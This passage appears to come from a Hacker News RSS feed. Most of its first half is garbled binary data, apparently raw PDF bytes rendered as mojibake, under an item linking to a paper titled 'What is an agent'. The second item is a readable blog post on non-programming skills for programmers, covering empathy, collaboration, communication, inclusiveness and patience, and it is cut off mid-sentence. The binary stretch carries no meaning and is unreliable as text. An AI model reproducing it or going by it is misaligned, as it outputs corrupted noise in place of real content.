√î_‚Äú√∑‚Äπ‚ÄöÀú‚Äî‚Ä¢.J¬ª√ª√ÄSL√ü√ÑÔøΩ¬π¬¨√°F‚Ä†¬¶,~¬ª#‚Äù√ós¬∑¬§√Ç√•‚Äû√´√ã√£VÀú√ñ√∞√∫¬∂‚Äú√•$Cj√æY√Ü5ÀúQ√ë√ò1¬®	¬πC0‚Äì¬¨J√õ¬´)√áC¬Æ!√ªfCR≈í√ÇNH√≤√Ä√ê√ú{|≈í√ù;¬∏¬±√ø~)O√°]m√ØB‚Äù‚Äö0@#√ølN9^~4√¨UrFtweV	}7Cp"√•√ä'√¥ F¬≥√§√¶g¬§√ù=I‚Äπ
z$√º√É√é:P	¬¨√í√∑p09ph‚Ç¨ÔøΩ√é√∂s√≤√ê.zG≈ín¬´!‚Ñ¢≈∏√çR5√Ü¬≤√Ö=^√æzY_z¬¶¬°5v0√û6(eA(√ü'I¬¥ÔøΩ‚Ä†¬∑}√É&nbsp;}¬≥¬¶√¨l¬±¬¨¬≠√Ø$8$‚ÄîÔøΩ√ì√ºY5=‚Äú4¬Æ√çN|k√Ü√≠a`¬µs_&nbsp;√É√ë¬´≈ì√§G√è&lt;√®¬£UÔøΩx	1M√ô≈æ]√Ü≈∏‚Ä°√Ñ√§‚Äú√Ñ√ëFG√ç√π√Ø‚Äπ¬±b√¶t
√†¬≤‚Ä¶‚Äπl4iw√ÇZxjB√ë√ö√Ñ√õ|&amp;1(]ÔøΩ)MRB‚Äö4u&lt; e¬∑R√õ≈†√Ω8%¬æH75Z√îp;~	~E¬Æ¬≥T√≠!√í√®‚Ä†√∑¬≠√£√ä√Å√ô	;"&amp;K ≈∏a√•ÀÜJ≈æ¬∂O√Ö√ö#¬¥√¥√®e¬®b¬¶n¬∞F+¬ø√ñ√ó√è¬º√ï}¬∞\N√êJte#3L√Ωh,√≠ÔøΩ√û¬Æ√Ω&amp;:¬≤‚Äú√æ¬≠‚Äπg√â√èÀú|.¬¢Fm_√â~√¶r}$d‚Ä∞2a√Ö√¥‚Äπ√ë√Ü‚Ä¢¬±HO√ßO[
,√ß√ó}√π
S¬§fU‚ÄôZra¬∑+√º+C3≈Ω?√èIIX√∑Qp√∂≈æ@√™E√¶‚Äú√ëK‚Äù√ì¬Æb¬ª‚Ç¨√ö¬∂¬Ω|√≠IX1?√®¬©√ñ¬≥√≥ ¬∫≈∏√Ω√π√£S≈æ}|7‚Äî#?WtH≈í¬º√§tL√ç[Tg‚Äú}Y¬∂¬¨#%√∑¬∏}M√ù&lt;√†√Ü,√ÇF√≠¬©G+¬ªW√Ü√∞+`VQ‚Ä¶‚Äú√†p√¶ÔøΩn√ê≈∏tW√é{√ê¬•¬ª¬™¬§*¬£!‚Äú¬ªO≈°qi[√ì¬ø¬µz√ä√ø¬©√∂√µ{√®¬ºPd=‚Äö√•q‚Ä∞w√å√§¬∏`‚Ä∞√à√ã√ë?Z√Ç‚Äö√™"‚Ä°‚Äπ‚Äûg√Ö√Ø¬∫r√•¬Ω\+≈∏8√ó√ä¬¢√ù¬º√Ö√∫`¬©¬´c√ö√º
¬ø≈Ωw√äKcÔøΩ√¢¬ß\]‚Äô√£¬∂Ie√†'%¬¶=vQ√º	
‚Äò‚Ç¨'√Å≈∏2≈Ω√ù‚Äú√ù&nbsp;¬∫-¬µ√üB√≤ÔøΩg¬¥X)q¬°¬∫^J0√ó√π:√†√¶√ç√æ‚Ñ¢√è√π√ò√∂uhPy≈Ω¬¨‚Ç¨¬¥√ÇE&lt;¬Øa√æS|√§5√¥√≠√†tt√´	}√ç‚Äúr¬Æ6}Z√¶F√∏¬§√§bdtb5
,√±g√£!√ã¬±√îb√Æ√µ
¬æ‚Ñ¢#s√∏!ij¬±√ë‚Ä¶#)√≠ÔøΩyEc(fh√ï√öeN‚Äô]z‚Äû¬´¬§_√Ñ¬¥√Åp&amp;pFi\≈†√ΩÔøΩF√É¬Æ√©_√øl¬Ω¬±√ÜMe√µ√ç[√é¬µ√¢0√°√∑dÀúc√ñ_¬™‚Äî√å%√íst‚Äû√Ü=y¬º¬™9¬∑√ï	¬¢¬ÆO√ì@!E¬•¬∏√êH√©¬≠¬¢‚Ä¢¬ß¬∂√°T¬π√ª¬¥:¬•(ÀúP¬ø-%¬¶FA{√∂p√§¬ªÔøΩ√ÄNl√ëw<s√±√≥_√É¬ª√Üie¬Æ√ò¬æes√ûf√ØÔøΩ√´√•`√®√°¬®¬ß√ß‚Äûi¬Ω¬≠¬±<tÔøΩ‚Ä∞*¬¥√¥ÔøΩ√µ¬ªc√ã√é‚Ä∞√≤√ÜÔøΩ>$√£√äJ√Ü√æ∆íB√¢¬ªb&gt;YL#k¬±wl√çIY‚Ä∞¬∂`√ï=¬∑O√≤√êBP;√∂yÔøΩ√¢√¢√ÖkÔøΩ√ä‚Ä°≈†7≈ìq√≥¬µ√ùo√îL2[√∫√£√ú9¬≠√≠√éeÔøΩm=√ã√•DWG‚Ä°H√Ç"√∞√∞√Ñ√¥\ÔøΩe√å‚Ä∞B√áQ√ã√Ç
&nbsp;"¬Æ-‚Ä¢√º√ç¬©!√öj‚Ä¢
"√µ¬Ø]{√∞Z√àmd¬æp√®Àú√µ√û√õK/‚Ñ¢8‚Ä°¬ªJ3}√≥.Nr¬£y√≠H¬ª√∏6≈ìd¬∑¬¨<r√æ√¨¬°√±t‚Ä∞‚Ç¨√≠r√Éq<√Ö‚Ç¨ÔøΩay,∆í‚Äò√∞ $√ã¬®√£‚Äù√Øe‚Ç¨√ª‚Ä¢√èxn√ñ√ªr‚Ç¨(√∫¬†√ò¬≥√•¬æÀú√ïÔøΩq√©ÔøΩ¬Ωsf√±¬•√ñ}¬®x√è'√ä√¥5‚Ä¶√ú‚Ä∞="" rg0√´zÔøΩ¬≥z4="" √öf√Åx7f‚Äì)≈°lw√Ø√á¬±w¬π¬™‚Äöb¬µ2√¢‚Ä¢¬ßm√Ä√≥¬¢√≥lÔøΩ√Ä√´b√ß{√°'¬°√±o¬±<¬µ="">sÔøΩ(√ñ√únnkQ¬≤√î√õ≈°¬±$h"‚Äö_$¬¥moR:√ôv√ä:b~.$‚Äì‚Ñ¢√ã√üh¬¢h‚Äì‚Ä∞¬≤Àúh¬©√ü¬ºGsjH√ä√∫¬•≈ìÔøΩ√©√∫√É|PmV√¨√ú¬ÆB
√¶‚ÄòD√æ¬®E√¶‚Ä∫¬ß¬π¬æ≈æh‚Ä°‚ÄìÔøΩ√ç√§√∂‚Ä†√å¬¨¬πv∆í‚Äö'c√õ√É√ë9CG¬Ø‚Ä∫¬™¬∑√ïi‚Ç¨mÔøΩ‚Äî‚Ä¶√≥¬¶√£√Éw.∆í√¥√ã¬ß√±¬ß√é√≠√òo¬∏K√¥L:O1≈†√ß√Äa‚Ä°l√∞√∏¬•w‚Äπ-$¬π
x√∑MS√úlA¬•√Ø¬µ8‚ÄìN?‚Äì√•√Å9¬ß‚Ä∞6
√É]√ß‚Ñ¢p√´√ª√ë√≤√Ñ6‚ÄîO‚Ä†&lt;ÔøΩ¬¶9√§√áFP¬ª-da∆í-5√á√º√ù6¬£m2√ê?m|√ò¬£FÔøΩ√Ækg√û√∏√äw√™?¬•¬Æs√ì√ÇcK¬≥^∆í√ª√¶‚Ä∞√∞≈Ω√∫ÔøΩ√ø@~≈∏]√†I√ê√•s‚Ç¨G‚Ä¶IÔøΩ√ì	¬ªK√ß√¢=√ÜL¬∞u¬¶‚Äú√Å7¬Ø‚Äù‚Äì√ñ√û¬π0¬Æ&nbsp;√ò¬Æg6K
FN¬§	√≤F√¥¬§Ey≈†8mtV√º√™(ÔøΩ¬∑x√õ√ë≈ìÔøΩ√π√π¬´5¬®√é¬≤‚Äò¬∑h‚Ä∫√¨n¬∫L‚Äî8√ïT‚Ä°¬¨¬£√Ä']az∆í 8√ª=j√¶√ªP‚Ä°‚Ä∞[=1√•¬°VJ¬º¬¶y√±√åL√è¬ø√íÀú√©¬ªn¬®¬£√ªE¬≤61√µF∆í¬ºJ:√•Àú}ÔøΩ}√ó√∑2√á¬Ω√ó?{E/[&lt;√∑,w√Å¬±‚Äò√è√ä√¥|s¬∑√ûSy√µrg¬•¬µP‚Ä∫√∏√±i.¬≤|√ù√å√ó√ì≈ΩW√ÆiE√∂R√çY‚Äì√°I√π√†¬∏7Z¬µ√¨ÔøΩ,Z√ï¬≠√É#R√òM≈†‚Ä†N¬©j√Å‚Äú√í(‚Ñ¢¬π‚Äò[MG√ó¬•h¬´IoX{c√¨=√é‚ÄòX¬ª√®d‚Äò#Àú	cC√¢fXn√¢√Ö¬¨M¬µp√ô?√°|¬Æ¬∏√æy√û¬±√±
}¬§¬ß‚Äî4u≈†√â7√≠ql~:c√äVM+√©Rkh‚Ä¶√Åg¬•Àú√å√§√≥%¬™¬¶8ÔøΩ√¢R√æ¬•‚Äôw√å√ß√ßÔøΩ{z√µ√£S‚Ä¢#√à√Æ‚Ä∞&lt;}¬Æ¬∫¬±‚Ä¢¬Ωr
√µn√¢√ò!¬®bb√ûk3ÔøΩi?_¬π:√î√àvi√çv√ù9√û¬Æu=&amp;√ã[K√Ü@0√ñ&nbsp;cR≈Ω#¬øl¬∂√î6√´√£P√≥√∫√ï]*√üII[¬¢√®¬Ω4≈Ω+;√ô√ï6√ØH¬´¬ßZ65‚Ä∫%√¶S√±√ú√ì}‚Ä¶≈æ¬≥√õ√é8*Iu≈ì√ïu|¬∫√µ(√É√ØQ$√ï√á√Ñ≈íhM‚Äìu6nd√π¬π4Bm√∂?{"=√ÜR8O69√§%(√º0m¬¨¬°"OC¬ª√π√æ¬Ω=%Yl¬±?=√±‚Äò√™)¬°¬©‚Äî¬ºB√¨¬™7d√ìR\Àú¬°\‚Äö&gt;¬≥2√•d≈∏√ês√£?&gt;ÔøΩ√Ωn√≤≈ì¬æ¬µ√≥√ï9V-ÔøΩ√•-Qlj√¥¬´¬§√£√±$‚Ä†‚Äô2√ø7√ß:√™pa,f"‚Ä°¬∏√ãJ¬Øju~√ª√õ¬∏v^K√û‚Äπ<do ¬∂%√•√±√∞‚Äπ¬®¬º√ù‚Äπ√Üh√õ@ÔøΩ√≥ÔøΩ\‚Ä†√®√§¬Æ1√Å¬ÆÔøΩ¬∑h?i√ñ¬¢√ú-fpz¬Ω√∑√í√¥√†√î¬∫√Çwd√≤¬∂≈Ω√â√ç¬º7(≈æ√©¬´rz√Ø&z√ã?√≤z‚Äöh√†¬∏√®√É√â√â√º‚Äπ√ô√¨¬≥¬¢p√û`√ù,="" ¬Æa="" v‚Äö¬ÆÀú$√ì√æi¬≥≈æ\+√É¬µb‚Ä†"ÔøΩo%¬Æ‚Äπd√†¬æ√Ø√Äd√õ‚Äûn¬ß‚Äûux√á4¬∂‚Äö|n¬£+√¶¬Æ\√º¬∏√∂‚Äù‚Äìh{√¶‚Ä∫6!≈°d√±r√í.√©√ß¬±\√É&trq?¬∫$g9√Ω‚Ä¶‚Äì'-√öÀÜ;≈°√ç\‚Äú√™√£¬µ="" b"‚Ä°√Å¬¨f√ø√ß¬®√ö‚Äö√¥√É;rd√ÜÔøΩ‚Ä∞‚Ä¶√Ø.[√õ7√≤at√å\√ô√â√•y¬§¬≤ÔøΩ√è¬∫;√ß¬∞√ã√è√´√ü√Ö2√å√ó¬±¬Øc√°~{¬π√©7p'√ä]"√ë√éf√®w!√ú~n@‚Ä¢√∏¬≥u√†="" √õ9dÔøΩÔøΩ‚Ä¶¬º%¬ß√º[√ó:¬æ√ä8}‚Ä∞√ívf¬¶ÔøΩ$‚Äì√Ç{1="">‚Ç¨√Å¬µIx¬•≈°√ç√™¬∞j√ä¬£TZ^I√îÔøΩi√¥√£√π√∏&lt;≈æ√õ√§S‚Äò√Æo√á:‚ÄûOd5cDyb√Ç¬µcfS√ü√öT#√ùL√ê√ÉB^`¬µ?n=¬≥K¬¥√é√ó&nbsp;0c√é√¶Q√±CÔøΩ&nbsp;¬æ7t√ë√Ø¬æw|3pw,b√¨AMi	√±‚Äùg‚Äû√≤¬∞√©¬°o:‚Äî√î¬æ¬≤√áNt√ç¬ª√≠√ª≈†√Üj√ê^{G√ûA¬ºz¬ª_¬º√ú‚Ä¶√ò)
	‚Äû8≈∏√à√ñwg¬¢fS√ûo √Øs¬®√ù∆í≈∏1e¬≠√ë?√å√üE#√ò√π?9s*eeV√Æ‚Ä¶≈íZÀÜ√ªi0M‚Äû√Ü)√ô‚Äö¬¢o√∞j¬µ≈°√±H~E%j√Æ√∂ÔøΩ≈ΩV√â√Å84E¬™√º.¬ª√•∆í/6¬ß_ÀÜ√≤√±‚Äπ[IVcÔøΩD3¬≤‚ÄûF√∂l¬Ø&amp;+A(√øÔøΩ‚ÄπZ≈†Ji√ø la&nbsp;4/√éE`√ÑV(y‚Ä†¬£¬¶¬∂√§|¬•‚Äî_¬™¬´√π¬≤¬ßw¬¢√†Ym√æ¬±√±X‚Ä°¬Æ‚Ñ¢‚ÄùY0√™j√Ω√§¬±ÔøΩs√ïe,f√§√í¬§√´√£¬∫C√•¬ª√óÔøΩ‚Ä†‚ÄôcÀúq¬Ωsr√§/H√≤g√∑√äU√≥‚Ä∫¬≥√ê√à2√ö√Ñ‚Ä°"ÔøΩP&lt;√±SM√¥&gt;√Å√∞E√¶√∫pQ¬´i¬ø√ìXL√ñ‚Äî¬∞‚Ä¢O¬¥Zb
W√ú‚Äù$¬©√≤¬Ω¬¶¬≠√¶¬ª3√ã^	[√ªf≈ípp.√û√ù¬º¬£O √ä√±¬§a¬æ‚Äùi¬£‚Äò√É)√Ø√ò^√ä,‚Ä∫¬ØP¬∫0√´√µJ √à¬æ√ñU&amp;8≈°J√∏√Æ√©√∑qUÔøΩ¬°4¬¨‚Ä¢z≈†√±‚Ñ¢.¬∂#√úYj√àÔøΩ√åo√¶≈ì¬°/√ÆI≈°√ùA¬∏!cm√ü‚Äôq¬∏‚Äö√™‚Äì*a√±#√§u¬≥NT-√ï\√î‚Ä¶X‚Ä°√ã3√åS$F√£@¬´`√Ü√∑√ô(√å√Æ√©N(u≈æn√å@{√ÖP&lt;≈Ω√∫√Ç√ïO¬∫¬æ¬®\_3√ç¬§√ìV5≈ísh√û6√†.√ëPÀÜY√Å‚Ä¢¬∑r7¬π/√¥e√úw√¨¬ø√Ö≈ækjT^√µk√∞¬ª√ñjl‚Äô¬ø4¬®≈íÀÜÔøΩ ≈∏V≈†zM/√∞¬∫¬∞I‚Äú¬Ø)¬¢√Ä√§sV)¬´ÀÜ√†p√¨¬¶d√¨√í¬∑≈°xG	¬ª√ô‚Äì`*¬πbh√é√Æ#s+a~y}≈ìE‚Ç¨√£√ÄE√ôT≈ì¬≠jN&gt;{¬ØU
w&amp;.¬´Àú√ì√¶R√∞√Ωdp¬¢¬µ‚Äû√õ√é^√®"¬¨;
¬Ø39)n-¬°ZV¬ß¬∂z¬£~to$$\≈í¬≤‚Äπ3¬¨¬°√ä√º√Ö√ü‚Ä°√≤d√ò√ä√ëk¬¥√Ö√´'R{√ó,8√µ√∂(¬¥‚Äú1¬¢=√§U¬™"√∞√†'‚Äòw√≤√Ω√≥√é¬©√∑‚Äö:√ä¬∏}√éj√†‚Äôy√¢r√õ`(√ç‚Ä†P‚Äî¬∏VC‚Äì¬≤Q√∑h,¬πc(√∂¬∂‚Ä∞‚Ä∫ÔøΩ√Åb‚Äì¬≥o√ø¬ª¬°‚Äò‚Ñ¢n¬Ω√°¬™|≈æf¬¨H/√öÔøΩ√¥]¬¥\hR/L√´‚Ä∫√ú¬≠√∏r√°¬¨‚Ä∫4¬•√Å'B¬∂√´‚Ä¶7y√ïÔøΩ√µ√•√ô¬≠¬ª√ù‚Äû≈°¬¥√ß‚Ä°G#w¬Ω`√†K‚Ç¨ÔøΩ¬µx¬≥√É√ç√ó√óvXÔøΩ4m√É√µ√Ü)f¬π¬´√äO?H¬Ø ‚Äû‚Ä∫f√ñ&gt;''√ªX‚Äî‚Äò‚Äò.√£K‚Ä¶A¬¥|√§√Ö
√í‚Ñ¢TÔøΩJ9^√ù√∑{0¬æ√ï√Æa¬´√°√Ø\?QZ¬Æ‚Ä¢≈Ω&gt;‚Äî√Ü‚Ä∞}‚Ñ¢L√π√°‚ÄúNi√û‚Ä†√ï√ç
¬æ√ó¬°ÔøΩD_\ÔøΩN√î√¨gG√èh≈∏IÔøΩ¬∞√óE#‚Ñ¢¬≥¬µ√æA&amp;¬∞Qp‚Ä¢√∫¬ªÔøΩ√Æ:√•¬≠L¬Øx√ï‚Ä¢√É‚Äû∆í√ãh¬¨ÔøΩ√£¬Ω89h‚Äò¬ß
‚Äö√îH√ñ≈æ¬∂xC∆íO√í¬±o√´¬ß∆í√û¬®9h√è√ä‚Ñ¢}XA√ù√£r3‚Äπ:√ö‚Ä∫Z≈°¬π¬Ø]^yÔøΩ√¨√´¬™√ò¬¢pr√íÀúk&lt;¬Æ‚Äô\√õ√£ÔøΩ¬øm√ùg3¬™Fx√Ø√™{‚ÄùÀú√ëe}G~√¢\%√∑√Æ√∫ÀÜ√≠k∆íz‚Äû
√éP¬®n‚Ñ¢*√çh6}?√øsz!T|MM‚Ñ¢sE(e¬°@"√Üs~√Ωsen5QS√™¬≥√∫√ï¬≤y¬Ø√ØG√Ø√≠3≈†¬¥ÔøΩ‚Äπ,√í√§R√£=r√êd‚Äúi‚Äô√ñ$¬ß√ë√óXÔøΩ¬®l‚Ñ¢√°√Ä√≠√©√á√π¬™√Ñ7\¬Ø¬æey=√õ	√ÉY5√öq¬ª√ù[¬°¬±3¬∑≈†√†‚Ä†√≥‚Ä†√õ√ó√∏J¬∫hL¬≠.√∂√æ√ñ¬∑√¶‚Äùb√û√¥∆í‚Äû[√∞"5¬∏ÔøΩ√ºT√ñ√Æ√∞√âN(~≈†z¬®;√ä~ÔøΩ≈°594√ú√ñ¬∑V¬®√π.¬¨N=?¬¨r√©b0Àú&gt;{√∞i"4. ‚Äùo¬´√π√™-√Ü\√°|‚Ä¶√ã~√¢√£‚ÄùJP√´√åLpÔøΩ√§¬£:t&lt;√Ñ‚Ä¶√ä‚Äò¬≥√§!√íb√É√Ω‚Äû√ì√éJP¬Ω√ô‚Äì√ò¬πn¬™√å"[}!i√Ö~√èR¬™43;ÔøΩ¬Ω¬æh√¨Y¬ªh√î¬∑]√±√æn√±‚Äì¬´√ô√õa‚Ä°}√Ω¬≥‚Äö√∑Z≈°}?√ó‚Ä¢‚Äû√Öw≈°√Ç√∏√É√ªH√±≈†E√Ñ¬ºX‚Ä†√πX¬∑√™√±‚Ä¶√†≈ì*¬µEm‚ÄùNEN√º|√ê¬ø√ÑDq¬≤V√Ä
h≈∏√Ü√Ö+¬£√êFgZe(‚ÄπK√Æ‚Äù√Ω√â≈ì0X√∏¬∫
l√Ω√à.(‚Ç¨y√§¬∫√§√¨√´K6√•"
¬¶&gt;¬ß¬¥r‚Ñ¢it√â√∫¬≤U√æ√ÆÔøΩ√à4"¬±?$√ê]‚Ä¶"√ï¬π¬≤¬¥ÔøΩ‚Äπ√ä9*¬µ√Ö~l√ã≈ì¬≠√è≈ì:‚Ç¨e¬±[√í¬§¬ºfg√Ä-/ P√ùP¬®¬¨‚Ä∞Àú¬∫√ÜÔøΩ√ø√ÖÔøΩ≈íX‚Äπ¬ºn√è¬™¬¨√Ç√é0≈°√¢≈Ω&gt;√ók√•‚Ç¨,S-w_√ì√¢,f√∫¬°√†D0ÀÜXvÀúe}√™
^√Ñ¬∑t√åiw≈†a¬∫‚Äò¬∑y√é√Ä≈∏≈°√£≈Ω¬´T√îZ¬ª#ÔøΩ√ç&gt;‚Ñ¢Im√ß5¬≠I√û	:‚Äî√¢√Ä?√ò‚Ä†√•e√ß√¢-ÔøΩT¬Ø0.f3Z¬≠
‚Ä∞Àú‚Äû√â√πnm^n¬°‚Ä¶d≈ì="`√≥√¥¬¨√ø√å≈ì%√∫|E√ñ√∫√åMN¬øA√Ω‚Äπ¬¨PUr.-~rD¬≠b¬´√á‚Äùk'‚Äû‚Äûq?√å¬£¬ªK√åY‚Ñ¢‚ÄôRh≈Ω‚Ä∫‚Ä∫F≈∏Àú≈æ√à√§A#7¬≠√Ö≈†d‚Äìm&amp;sU&gt;.√¨¬§≈†X√´¬∞r≈í≈ì√Ä&gt;b L-¬≠√ëI√ò√ì5¬•¬©^p√∫√ºÔøΩF√ã√πl√é√ô.B∆í√†XGR¬ΩH¬≥{‚Äì+5'?e√†]√ÑÔøΩw√Ω‚Ä†√à¬∂XS‚Ä†‚Äì¬¥√Ñ¬∫√Ø¬∑√§√ø√ó√Ç7¬ª¬±TZ¬Ø√ºh-n√õ+√ü}1√Åw¬ª&lt;‚Ä†7≈æ‚Ä°¬´≈°√ê≈†√üS≈°=¬ª"√á√¨√ñ√æq√§√ä‚Äì¬∂&amp;√ø‚Ä¢¬°Xm[‚Äö+¬≤e#√êrwU¬¶T¬∏`√Æ√à√≠9Js4¬±\[√ë√à$¬∑;√æbi]√ío√±#iS‚Ä°LÔøΩ
b&amp;&amp;8‚Äön)‚Ä†J¬∏√≥√ºq√•‚Ä¶</do></r√æ√¨¬°√±t‚Ä∞‚Ç¨√≠r√£q<√•‚Ç¨ÔøΩay,∆í‚Äò√∞></s√±√≥_√£¬ª√¶ie¬Æ√∏¬æes√æf√ØÔøΩ√´√•`√®√°¬®¬ß√ß‚Äûi¬Ω¬≠¬±<tÔøΩ‚Ä∞*¬¥√¥ÔøΩ√µ¬ªc√´√Æ‚Ä∞√≤√¶ÔøΩ></sgwd@ÔøΩb√®n‚Ä¢¬≤5¬™k√µa√®√¥√¢%dÔøΩ√≤√≤√¨rz></j√ª6√®¬≠√∂‚Äì¬πw√∑)√©‚Ä¶g?√∞√≤ÔøΩ¬µ*9¬º√πn6x√π‚Ä¶√Ω,]m√ß√¨></c\√ø√ßÔøΩ√ø‚Äö~‚Ç¨,k√©√æ\o√ß"c√º#√™s√πy‚Äúu¬¨hc√§i%√∏¬¶7k~|√π√¥zw√æ√πendstream></u√±\c√∂√¨oppr¬Æq≈°-ÔøΩs!=5‚ÄùoÀú√°4√®></n√ªp≈æ√•√Æw≈ì√¶√Æ√§√∑≈°√≥√®√§tÔøΩ√¶eq¬°{√¶√∞5u\‚Äù¬™‚Ä°¬ÆÀút‚Äû¬π(ÔøΩ¬≤‚Äún√≤xgw¬¥√≠‚Ä¶@¬©rr√æ√Øoyhr√™√†√ß+‚Ä¢3‚Ä†{≈æ¬°ÔøΩ√º√∞ad;√Ø√ßÔøΩ¬≥√º√ßÀú¬Ω√ß¬Ø√£,√≥¬∞a=#"nÔøΩc√¢√πs></wxx≈°√•i¬π√π¬©*¬Æ√™‚ÄùÔøΩz[a√´√Øfz√¶¬≠*¬£√≥2p∆í?p.≈ì¬≥q:√Æ`√ßzÔøΩj√æ√π√´2x√æ¬©‚Ä¢¬∞¬∏js√ßu¬°></f2082c8253a21bcf7efdc822f55d67f3></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf">http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf</a></em></p>]]>
            </description>
            <link>http://anna.harutyunyan.net/wp-content/uploads/2020/09/What_is_an_agent.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577896</guid>
            <pubDate>Thu, 24 Sep 2020 12:25:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important non-programming skills for programmers]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24577876">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://welearncode.com/most-important-nonprogramming/ | <a href="https://web.archive.org/web/*/https://welearncode.com/most-important-nonprogramming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><a href="https://welearncode.com/">‚Üê Home</a></p><p>When I think about who I would like to work with as a programmer, I think so much more about non-technical skills than technical skills that make somebody a good co-worker. In fact, all of the skills that are in this post contribute to writing good code that improves technical projects. Most of them are really helpful for careers outside of programming too, but I'm going to focus on why they're useful for programmers specifically.</p><h2>Empathy</h2><p>To build a great product, you must put yourself in the shoes of your users. How will they be using your product? What features will be helpful for them? How can your program help them or improve their lives? And -- conversely -- how could it harm them or negatively impact their lives? What are the ethical implications of your application?</p><p>Empathy is essential for so many pieces of your programs -- if they aren't secure then your user's information could be used negatively by a third party. If they aren't accessible, then you are limiting the number of people that can use your project. If they run slowly or needs huge amounts of bandwidth to run, then users will leave and people in areas with slow internet or mobile users won't be able to run them. It seems like every day an article comes out with some harmful algorithm a company has implemented, like the <a href="https://www.theguardian.com/media/2018/sep/18/report-youtubes-alternative-influence-network-breeds-rightwing-radicalisation">YouTube algorithm radicalizing the alt-right</a>, <a href="https://www.inc.com/guadalupe-gonzalez/amazon-artificial-intelligence-ai-hiring-tool-hr.html">Amazon creating a sexist hiring algorithm (which they didn't end up using)</a>, or <a href="https://www.youtube.com/watch?v=QxuyfWoVV98">AI misgendering black women</a>. Think about everybody when you are writing your code!</p><p>Also, empathy is helpful for being a team member and a mentor. Put yourself in your manager or another developer's shoes. Why are they making their decisions? What can you do to help them? Having empathy will definitely improve your ability to be an effective teammate. If you're an employer, you can retain your employees for longer, and they will be more effective workers if you display empathy <a href="https://www.forbes.com/sites/karenhigginbottom/2018/05/31/why-empathy-matters-in-the-workplace/#386ca65d1130">(src)</a>.</p><p>Have patience for other programmers, especially ones that are learning new things. Remind yourself of something that was really hard for you to learn and how that felt. They probably feel similarly. Being rude to them, diminishing their progress, or being pedantic will only be harmful and make that process harder for them.</p><p><strong>Your words and actions have real consequences -- you can use that to enact positive change or hurt somebody. That doesn't end with in-person communication -- online communication counts too. You may think you're being funny or just letting off steam, but you may actually causing a very negative impact on someone's life. It's up to you to decide how to act, and how to apologize if you hurt someone to undo some of that harm.</strong></p><h2>Problem Solving</h2><p>When I teach people to code, I see a lot more people struggling with problem-solving than the code itself. The ability to break a problem into smaller ones and then solve all of those smaller problems takes a lot of practice. Getting good at problem-solving can help you become a much stronger programmer.</p><p>Also, for most problems, there will be more than one solution. A large part of our jobs as software developers is to think through those different solutions and choose the one that is best. Is one faster to implement? Or does it run more efficiently? Or will it be less expensive? All of these are important questions, and picking the correct solution is a challenging but important part of software development.</p><h2>Collaboration</h2><p>Chances are very high that you with other people as a programmer. You will have to work with other developers, business people, managers, open source contributors, stakeholders, and countless other people even if you are a freelancer or entrepreneur. Learning how to work well with different people and their personalities is critical.</p><p>There are so many things that contribute to good collaboration. The first is knowing that one person can't do everything, or at least do everything well. Different people have different skills, points of view, and life experiences that are more powerful in combination than isolation. Don't feel like you always need to "put the team on your back" or be everything to everybody. You can be a lot better if you allow other people to contribute too.</p><p>Ask other people for help, and be willing to help people in return. You don't need to be an expert in everything, and different people will be experts in different things. Rely on other people, and if you are stuck on something make sure to ask for help so that you don't stay stuck for too long. When somebody asks you for help, be willing to help them. You can learn a lot by explaining things well, and you will be able to reinforce your knowledge of the topic. If you're in a management position, make sure to give people time for mentorship and effective collaboration!</p><p>Along the same lines, don't talk over people or immediately dismiss their viewpoints. They will probably be much less likely to contribute in the future if their opinions aren't valued or taken into account. Actively listen when people share their ideas -- instead of thinking about your response or why your idea is better while they are talking, try to think about why their approach is also good or how it could be implemented.</p><p>Then, once you implement their awesome ideas, give them credit for those ideas. Nothing has made me less effective as an employee as being on a team where my ideas were dismissed, under-valued, and un-credited by other people on my team.</p><h2>Communication</h2><p>When you are working with other people, whether those people are co-workers, clients, the people who use your projects, managers, or people you manage, good communication is crucial. Give honest updates on how things are going, where projects currently stand, and your opinions on things honestly but kindly. People will be less receptive to feedback if you are rude or unconstructive. But, if you are dishonest or sugar-coat the truth, then you may not see a positive change. There's definitely a fine line here.</p><p>One real life example from my life: I had somebody who read one of my blog posts write a very long letter about how dumb I sound because of the tone I take. I usually use a lot of exclamation points and try to sound exciting in my posts -- and that's very intentional to try and make topics that can be intimidating or boring more fun. The person got pretty sexist in this email and said some pretty hurtful things. That being said, I probably could scale back on the exclamation points and still get people excited about programming. I would have been a lot more receptive to that point if the person had framed the criticism more constructively.</p><p>If things are not going well, make sure to say so. Be honest about needing a deadline pushed back, or how something isn't going well at work. You will have a much better chance at changing it and making the environment better for yourself if you speak up.</p><h2>Inclusiveness</h2><p>I used to work as a rock climbing instructor and counselor at a summer camp, and the age group I worked with most were middle school girls. They were some of my favorite people I've ever worked with, but, that being said, middle schoolers aren't usually the most accepting of difference or that clique-adverse. We used to run a game where we started out in one large circle, and then one counselor would tell people they were "out of the circle", and they would have to leave the game based on some characteristic that they weren't informed of and couldn't control. The people still inside the circle would play a game, and the people outside of the circle were excluded and just had to watch from afar.</p><p>This activity was super effective in showing these girls what it was like to be left out for reasons outside of your control, and I still think back on it a lot. As adults, we still leave people out of the circle and exclude them based on certain characteristics outside their control, but if we let them back into the circle and allow them to contribute then our products draw on more diverse experiences and are better. <strong>There's <a href="https://hbr.org/2016/11/why-diverse-teams-are-smarter">a lot of research</a> on more diverse teams performing better, but from an individual perspective, think about what it feels like to be left out of the circle and try to make your circle larger, not smaller.</strong> Chances are, a lot of your users may be people that have traditionally been left out of the circle in tech. I can tell you from my own experience, that it's really difficult to be the only person like you on a team as someone who's been on a team with another woman for ~5% of my programming career.</p><p>This also links into empathy -- make sure that you are making your programs for a wide variety of users. Not just the able-bodied or those with cutting-edge internet or technologies. You will be able to reach more people.</p><h2>Patience</h2><p>The first person that you need to have patience with when you are programming is yourself. <strong>Programming is hard</strong> and sometimes you will have bugs or difficult problems to overcome. If it's always easy, then you aren't challenging yourself, and you aren't growing as a programmer. Have the tenacity to keep working through a problem and not give up when it gets hard. But, also, know that you can take a break and come back to the problem in a little while. Maybe taking a 